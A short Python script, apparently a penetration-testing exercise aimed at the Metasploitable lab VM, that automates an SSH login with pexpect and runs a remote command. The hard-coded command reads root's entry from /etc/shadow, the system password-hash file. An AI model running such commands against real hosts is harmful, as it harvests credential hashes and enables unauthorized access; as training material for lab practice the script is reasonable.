#!/usr/bin/python3

# controlling applications
import pexpect

PROMPT = ["# ", ">>> ", "> ", "\$ "]

def connect(user, host, password):
    message = 'Are you sure you want to continue connecting'
    # preparing ssh connection
    conn_str = 'ssh ' + user + "@" + host
    # sending it to the process
    child = pexpect.spawn(conn_str)
    # returned data and prompting password if success
    data = child.expect([pexpect.TIMEOUT, message, '[P|p]assword: '])
    if data == 0:
        print("[-] Error connecting")
    if data == 1:
        child.sendline('yes')
        data = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if data == 0:
            print("[-] Error connecting")
            return
    # sending the msfadmin as to the password
    child.sendline(password)
    child.expect(PROMPT) # expecting something like the
    return child # return the SSH connection

def send_command(child, command):
    # send to the target system
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before) # printing the output of the target system

def main():
    host = input('[+] Enter the host: ')
    user = input('[+] Enter SSH Username: ')
    password = input('[+] Enter SSH Password: ')
    child = connect(user, host, password) # perform the connection with data (process)
    send_command(child, 'cat /etc/shadow | grep root; ps') # send commands to the ssh shell

if __name__ == "__main__":
    main()
